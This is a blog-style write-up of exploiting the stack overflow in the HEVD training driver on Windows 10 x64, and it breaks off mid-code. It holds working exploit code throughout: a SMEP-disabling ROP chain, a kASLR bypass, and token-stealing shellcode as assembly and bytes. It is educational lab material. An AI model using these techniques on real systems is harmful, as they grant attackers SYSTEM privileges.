<!DOCTYPE html>
<html lang="en" class="dark">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://acebond.github.io/">
  <meta property="og:title" content="Windows 10 x64 Kernel Exploitation - Stack Buffer Overflow using HEVD">
  <script src="https://cdn.tailwindcss.com/3.4.16?plugins=typography@0.5.15"></script> 
  <script>tailwind.config = {darkMode: 'selector'}</script>
  <script>
    if (localStorage.getItem('theme') === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
      document.documentElement.classList.add('dark');
    } else {
      document.documentElement.classList.remove('dark');
    }

    function updateIcon() {
      const button = document.getElementById('dark-mode-toggle');
      if (document.documentElement.classList.contains('dark')) {
        button.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide-icon lucide lucide-sun"><circle cx="12" cy="12" r="4"></circle><path d="M12 2v2"></path><path d="M12 20v2"></path><path d="m4.93 4.93 1.41 1.41"></path><path d="m17.66 17.66 1.41 1.41"></path><path d="M2 12h2"></path><path d="M20 12h2"></path><path d="m6.34 17.66-1.41 1.41"></path><path d="m19.07 4.93-1.41 1.41"></path></svg><span>Light</span>`;
      } else {
        button.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide-icon lucide lucide-moon"><path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"></path></svg><span>Dark</span>`;
      }
    }

    function toggleDarkMode() {
      if (document.documentElement.classList.contains('dark')) {
        document.documentElement.classList.remove('dark');
        localStorage.setItem('theme', 'light');
      } else {
        document.documentElement.classList.add('dark');
        localStorage.setItem('theme', 'dark');
      }
      updateIcon();
    }
  </script>
  <title>Windows 10 x64 Kernel Exploitation - Stack Buffer Overflow using HEVD</title>
</head>
<body class="dark:bg-gray-900">
  <div class="container mx-auto px-2">
    <nav class="max-w-screen-lg my-10 mx-auto dark:text-white flex justify-between items-center">
      <strong>
        <a href="/index.html">HOME</a>
      </strong>
      <button id="dark-mode-toggle" aria-label="Toggle Dark Mode" class="flex items-center space-x-2" onclick="toggleDarkMode()">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide-icon lucide lucide-sun"><circle cx="12" cy="12" r="4"></circle><path d="M12 2v2"></path><path d="M12 20v2"></path><path d="m4.93 4.93 1.41 1.41"></path><path d="m17.66 17.66 1.41 1.41"></path><path d="M2 12h2"></path><path d="M20 12h2"></path><path d="m6.34 17.66-1.41 1.41"></path><path d="m19.07 4.93-1.41 1.41"></path></svg>
        <span>Light</span>
      </button>
    </nav>
    <article class="prose lg:prose-xl dark:prose-invert max-w-screen-lg my-10 mx-auto">
      <h1>Windows 10 x64 Kernel Exploitation - Stack Buffer Overflow using HEVD</h1>
      <h2>Setup</h2>
<p>This has been repeated 100 times, so I'm keeping it brief. The debuggee and debugger are Windows 10 x64 fully up to date. I used the following commands to setup the debuggee virtual machine. The debugger VM I installed WinDbg, Visual Studio, and Binary Ninja.</p>
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;"><code><span style="display:flex;"><span>bcdedit -set TESTSIGNING on
</span></span><span style="display:flex;"><span>bcdedit /debug on
</span></span><span style="display:flex;"><span>bcdedit /dbgsettings net hostip:&lt;HOST IP ADDR HERE&gt; port:50000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sc create HEVD binPath= C:\driver\vulnerable\x64\HEVD.sys type= kernel
</span></span><span style="display:flex;"><span>sc config HEVD start= auto
</span></span><span style="display:flex;"><span>sc start HEVD
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sc query HEVD
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sc stop HEVD
</span></span><span style="display:flex;"><span>sc delete HEVD
</span></span></code></pre><h2>Trigger the Exploit and Gain RIP Control</h2>
<p>I triggered the buffer overlow with a <a href="https://wiremask.eu/tools/buffer-overflow-pattern-generator/">cyclic pattern</a> to easily identify the offset for <code>RIP</code> control.</p>
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;"><code><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>(<span style="color:#8be9fd">void</span>) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	HANDLE hDriver <span style="color:#ff79c6">=</span> CreateFileA(
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\\\\</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">HackSysExtremeVulnerableDriver&#34;</span>,
</span></span><span style="display:flex;"><span>		GENERIC_READ <span style="color:#ff79c6">|</span> GENERIC_WRITE,
</span></span><span style="display:flex;"><span>		<span style="color:#bd93f9">0</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">NULL</span>,
</span></span><span style="display:flex;"><span>		OPEN_EXISTING,
</span></span><span style="display:flex;"><span>		FILE_ATTRIBUTE_NORMAL,
</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> payload[] <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3....De8De9Df0Df1Df2D&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	DeviceIoControl(
</span></span><span style="display:flex;"><span>		hDriver,
</span></span><span style="display:flex;"><span>		HEVD_IOCTL_BUFFER_OVERFLOW_STACK,
</span></span><span style="display:flex;"><span>		payload,
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">sizeof</span>(payload),
</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">NULL</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#bd93f9">0</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">NULL</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre><p>After the crash, we can use WinDbg to inspect the stack (<code>dq rsp</code>), and find the value we tried to <code>ret</code> to. And then looked up the pattern to find the offset for <code>rip</code> control.
<img src="/assets/img/2025-01-23/crash_with_pattern.png" alt="Crash with pattern">
<img src="/assets/img/2025-01-23/offset_found.png" alt="Offset found"></p>
<h2>Time to ROP</h2>
<p>Because of DEP, and SMEP our only option is to ROP (althought I believe CET/shadow stack if enabled and supported by the kernel would stop ROP).</p>
<p><strong>DEP</strong> - The easiest solution is to allocate an executable page in userland for our shellcode.</p>
<p><strong>SMEP</strong> - Disable SMEP by flipping the <a href="https://wiki.osdev.org/CPU_Registers_x86#CR4">20th bit</a> in the CR4 register. This disables SMEP system wide, and will let us execute userland pages from the kernel. (Note that with virtualization-based Security (VBS) CR4 would be protected)</p>
<p>I used <a href="https://github.com/Ben-Lichtman/ropr">https://github.com/Ben-Lichtman/ropr</a> to find some gadgets to disable SMEP by modifying the CR4 register. Note the addresses given by ropr (and tools like Binary Ninja) include the 0x140000000 image base which needs to be subtracted.</p>
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;"><code><span style="display:flex;"><span>	u64 POP_RCX     <span style="color:#ff79c6">=</span> kernelBase <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x9b2952</span>; <span style="color:#6272a4">// pop rcx; ret;
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	u64 MOV_CR4_RCX <span style="color:#ff79c6">=</span> kernelBase <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x9aa31b</span>; <span style="color:#6272a4">// mov cr4, rcx; ret;
</span></span></span></code></pre><p>Also note, you cannot pick gadgets within any sections of the PE file marked as <a href="https://devblogs.microsoft.com/oldnewthing/20120712-00/?p=7143">DISCARDABLE</a>. These <a href="https://pedump.me/42a130909c358ce63f80c1a9dd0a061d/#pe">sections</a> will be scrambled after initialization is complete.</p>
<p><img src="/assets/img/2025-01-23/DISCARDABLE_sections.png" alt="DISCARDABLE_sections"></p>
<p>Because these gadgets are within the kernel (C:\Windows\System32\ntoskrnl.exe), we need to break kASLR. Lucky we are on Windows 10 running in medium integrity and there are many Win32 APIs to do so. On Windows 11 24H2 this requires a kernel memory leak.</p>
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;"><code><span style="display:flex;"><span>PVOID <span style="color:#50fa7b">GetKernelBaseAddress</span>() {
</span></span><span style="display:flex;"><span>	LPVOID drivers[<span style="color:#bd93f9">1024</span>] <span style="color:#ff79c6">=</span> { <span style="color:#bd93f9">0</span> };
</span></span><span style="display:flex;"><span>	DWORD cbNeeded;
</span></span><span style="display:flex;"><span>	EnumDeviceDrivers(drivers, <span style="color:#ff79c6">sizeof</span>(drivers), <span style="color:#ff79c6">&amp;</span>cbNeeded);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> drivers[<span style="color:#bd93f9">0</span>];
</span></span><span style="display:flex;"><span>}
</span></span></code></pre><p>The kernel base address can be confimred by running <code>lm sm *nt*</code> in WinDbg.</p>
<p>The new code is:</p>
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;"><code><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>(<span style="color:#8be9fd">void</span>) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	u8 token_steal[<span style="color:#bd93f9">256</span>] <span style="color:#ff79c6">=</span> { <span style="color:#bd93f9">0x90</span> }; <span style="color:#6272a4">// NOPs
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	
</span></span><span style="display:flex;"><span>	u64 kernelBase <span style="color:#ff79c6">=</span> (u64)GetKernelBaseAddress();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	u64 POP_RCX     <span style="color:#ff79c6">=</span> kernelBase <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x9b2952</span>; <span style="color:#6272a4">// pop rcx; ret;
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	u64 MOV_CR4_RCX <span style="color:#ff79c6">=</span> kernelBase <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x9aa31b</span>; <span style="color:#6272a4">// mov cr4, rcx; ret;
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>	HANDLE hDriver <span style="color:#ff79c6">=</span> CreateFileA(
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\\\\</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">HackSysExtremeVulnerableDriver&#34;</span>, <span style="color:#6272a4">// lpFileName
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		GENERIC_READ <span style="color:#ff79c6">|</span> GENERIC_WRITE,
</span></span><span style="display:flex;"><span>		<span style="color:#bd93f9">0</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">NULL</span>,
</span></span><span style="display:flex;"><span>		OPEN_EXISTING,
</span></span><span style="display:flex;"><span>		FILE_ATTRIBUTE_NORMAL,
</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">const</span> u64 offset <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2072</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">const</span> u64 payloadSize   <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2500</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">const</span> u64 shellcodeSize <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">4096</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	LPVOID payload   <span style="color:#ff79c6">=</span> VirtualAlloc(<span style="color:#8be9fd;font-style:italic">NULL</span>, payloadSize,   MEM_COMMIT <span style="color:#ff79c6">|</span> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
</span></span><span style="display:flex;"><span>	LPVOID shellcode <span style="color:#ff79c6">=</span> VirtualAlloc(<span style="color:#8be9fd;font-style:italic">NULL</span>, shellcodeSize, MEM_COMMIT <span style="color:#ff79c6">|</span> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	memset(payload, <span style="color:#f1fa8c">&#39;\x41&#39;</span>, payloadSize);
</span></span><span style="display:flex;"><span>	memcpy(shellcode, token_steal, <span style="color:#ff79c6">sizeof</span>(token_steal));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	u64<span style="color:#ff79c6">*</span> rop <span style="color:#ff79c6">=</span> (u64<span style="color:#ff79c6">*</span>)((u64)payload <span style="color:#ff79c6">+</span> offset);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	u64 index <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">*</span>(rop <span style="color:#ff79c6">+</span> index<span style="color:#ff79c6">++</span>) <span style="color:#ff79c6">=</span> POP_RCX;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">*</span>(rop <span style="color:#ff79c6">+</span> index<span style="color:#ff79c6">++</span>) <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xb50ef8</span> <span style="color:#ff79c6">^</span> <span style="color:#bd93f9">1UL</span> <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">20</span>; <span style="color:#6272a4">// hardcoded value of CR4
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#ff79c6">*</span>(rop <span style="color:#ff79c6">+</span> index<span style="color:#ff79c6">++</span>) <span style="color:#ff79c6">=</span> MOV_CR4_RCX;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">*</span>(rop <span style="color:#ff79c6">+</span> index<span style="color:#ff79c6">++</span>) <span style="color:#ff79c6">=</span> (u64)shellcode;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	DeviceIoControl(
</span></span><span style="display:flex;"><span>		hDriver,
</span></span><span style="display:flex;"><span>		HEVD_IOCTL_BUFFER_OVERFLOW_STACK,
</span></span><span style="display:flex;"><span>		payload,
</span></span><span style="display:flex;"><span>		(DWORD)payloadSize,
</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">NULL</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#bd93f9">0</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">NULL</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre><p>Running this we seen the ROP chain execute, disable SMEP, and <code>ret</code> into the shellcode which is currently just NOPs.</p>
<h2>Token Stealing Shellcode</h2>
<p>I stole all this from <a href="https://vuln.dev/windows-kernel-exploitation-hevd-x64-stackoverflow/">https://vuln.dev/windows-kernel-exploitation-hevd-x64-stackoverflow/</a> but double checked the offsets in Windbg. It's a token stealing shellcode combined with a generic way return from the <code>DeviceIoControl</code> syscall without crashing.</p>
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;"><code><span style="display:flex;"><span>[<span style="color:#ff79c6">BITS</span> <span style="color:#bd93f9">64</span>]
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">start:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">mov</span> <span style="color:#8be9fd;font-style:italic">rax</span>, [<span style="color:#8be9fd;font-style:italic">gs</span>:<span style="color:#bd93f9">0x188</span>]       <span style="color:#6272a4">; KPCRB.CurrentThread (_KTHREAD)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">mov</span> <span style="color:#8be9fd;font-style:italic">rax</span>, [<span style="color:#8be9fd;font-style:italic">rax</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0xb8</span>]     <span style="color:#6272a4">; APCState.Process (current _EPROCESS)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">mov</span> <span style="color:#8be9fd;font-style:italic">r8</span>, <span style="color:#8be9fd;font-style:italic">rax</span>               <span style="color:#6272a4">; Store current _EPROCESS ptr in RBX</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">loop:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">mov</span> <span style="color:#8be9fd;font-style:italic">r8</span>, [<span style="color:#8be9fd;font-style:italic">r8</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x448</span>]      <span style="color:#6272a4">; ActiveProcessLinks</span>
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">sub</span> <span style="color:#8be9fd;font-style:italic">r8</span>, <span style="color:#bd93f9">0x448</span>             <span style="color:#6272a4">; Go back to start of _EPROCESS</span>
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">mov</span> <span style="color:#8be9fd;font-style:italic">r9</span>, [<span style="color:#8be9fd;font-style:italic">r8</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x440</span>]      <span style="color:#6272a4">; UniqueProcessId (PID)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">cmp</span> <span style="color:#8be9fd;font-style:italic">r9</span>, <span style="color:#bd93f9">4</span>                 <span style="color:#6272a4">; SYSTEM PID? </span>
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">jnz</span> <span style="color:#8be9fd;font-style:italic">loop</span>                  <span style="color:#6272a4">; Loop until PID == 4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">replace:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">mov</span> <span style="color:#8be9fd;font-style:italic">r9</span>, [<span style="color:#8be9fd;font-style:italic">r8</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x4b8</span>]      <span style="color:#6272a4">; Get SYSTEM token</span>
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">and</span> <span style="color:#8be9fd;font-style:italic">r9</span>, <span style="color:#bd93f9">0xf0</span>              <span style="color:#6272a4">; Clear low 4 bits of _EX_FAST_REF structure</span>
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">mov</span> [<span style="color:#8be9fd;font-style:italic">rax</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x4b8</span>], <span style="color:#8be9fd;font-style:italic">r9</span>     <span style="color:#6272a4">; Copy SYSTEM token to current process</span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">xor</span> <span style="color:#8be9fd;font-style:italic">rax</span>, <span style="color:#8be9fd;font-style:italic">rax</span>
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">ret</span>
</span></span><span style="display:flex;"><span>
</span></span></code></pre><p>The full exploit code</p>
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;"><code><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;Windows.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;Psapi.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#8be9fd">signed</span> <span style="color:#8be9fd">char</span> i8;
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#8be9fd">short</span>       i16;
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#8be9fd">int</span>         i32;
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span>   i64;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span>      u8;
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">short</span>     u16;
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>       u32;
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> u64;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define ArraySize(x) (sizeof x / sizeof x[0])
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK IOCTL(0x800)
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span>PVOID <span style="color:#50fa7b">GetKernelBaseAddress</span>() {
</span></span><span style="display:flex;"><span>	LPVOID drivers[<span style="color:#bd93f9">1024</span>] <span style="color:#ff79c6">=</span> { <span style="color:#bd93f9">0</span> };
</span></span><span style="display:flex;"><span>	DWORD cbNeeded;
</span></span><span style="display:flex;"><span>	EnumDeviceDrivers(drivers, <span style="color:#ff79c6">sizeof</span>(drivers), <span style="color:#ff79c6">&amp;</span>cbNeeded);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> drivers[<span style="color:#bd93f9">0</span>];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>(<span style="color:#8be9fd">void</span>) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	u8 token_steal[] <span style="color:#ff79c6">=</span> {
</span></span><span style="display:flex;"><span>	  <span style="color:#bd93f9">0x65</span>, <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0x8b</span>, <span style="color:#bd93f9">0x04</span>, <span style="color:#bd93f9">0x25</span>, <span style="color:#bd93f9">0x88</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0x8b</span>, <span style="color:#bd93f9">0x80</span>,
</span></span><span style="display:flex;"><span>	  <span style="color:#bd93f9">0xb8</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x49</span>, <span style="color:#bd93f9">0x89</span>, <span style="color:#bd93f9">0xc0</span>, <span style="color:#bd93f9">0x4d</span>, <span style="color:#bd93f9">0x8b</span>, <span style="color:#bd93f9">0x80</span>, <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0x04</span>,
</span></span><span style="display:flex;"><span>	  <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x49</span>, <span style="color:#bd93f9">0x81</span>, <span style="color:#bd93f9">0xe8</span>, <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0x04</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x4d</span>, <span style="color:#bd93f9">0x8b</span>, <span style="color:#bd93f9">0x88</span>,
</span></span><span style="display:flex;"><span>	  <span style="color:#bd93f9">0x40</span>, <span style="color:#bd93f9">0x04</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x49</span>, <span style="color:#bd93f9">0x83</span>, <span style="color:#bd93f9">0xf9</span>, <span style="color:#bd93f9">0x04</span>, <span style="color:#bd93f9">0x75</span>, <span style="color:#bd93f9">0xe5</span>, <span style="color:#bd93f9">0x49</span>, <span style="color:#bd93f9">0x8b</span>,
</span></span><span style="display:flex;"><span>	  <span style="color:#bd93f9">0x88</span>, <span style="color:#bd93f9">0xb8</span>, <span style="color:#bd93f9">0x04</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x80</span>, <span style="color:#bd93f9">0xe1</span>, <span style="color:#bd93f9">0xf0</span>, <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0x89</span>, <span style="color:#bd93f9">0x88</span>, <span style="color:#bd93f9">0xb8</span>,
</span></span><span style="display:flex;"><span>	  <span style="color:#bd93f9">0x04</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x65</span>, <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0x8b</span>, <span style="color:#bd93f9">0x04</span>, <span style="color:#bd93f9">0x25</span>, <span style="color:#bd93f9">0x88</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>,
</span></span><span style="display:flex;"><span>	  <span style="color:#bd93f9">0x66</span>, <span style="color:#bd93f9">0x8b</span>, <span style="color:#bd93f9">0x88</span>, <span style="color:#bd93f9">0xe4</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x66</span>, <span style="color:#bd93f9">0xff</span>, <span style="color:#bd93f9">0xc1</span>, <span style="color:#bd93f9">0x66</span>, <span style="color:#bd93f9">0x89</span>,
</span></span><span style="display:flex;"><span>	  <span style="color:#bd93f9">0x88</span>, <span style="color:#bd93f9">0xe4</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0x8b</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>,
</span></span><span style="display:flex;"><span>	  <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0x8b</span>, <span style="color:#bd93f9">0x8a</span>, <span style="color:#bd93f9">0x68</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x4c</span>, <span style="color:#bd93f9">0x8b</span>, <span style="color:#bd93f9">0x9a</span>, <span style="color:#bd93f9">0x78</span>, <span style="color:#bd93f9">0x01</span>,
</span></span><span style="display:flex;"><span>	  <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0x8b</span>, <span style="color:#bd93f9">0xa2</span>, <span style="color:#bd93f9">0x80</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0x8b</span>, <span style="color:#bd93f9">0xaa</span>,
</span></span><span style="display:flex;"><span>	  <span style="color:#bd93f9">0x58</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x31</span>, <span style="color:#bd93f9">0xc0</span>, <span style="color:#bd93f9">0x0f</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0xf8</span>, <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0x0f</span>, <span style="color:#bd93f9">0x07</span> };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	u64 kernelBase <span style="color:#ff79c6">=</span> (u64)GetKernelBaseAddress();
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (kernelBase <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x00</span>) <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>
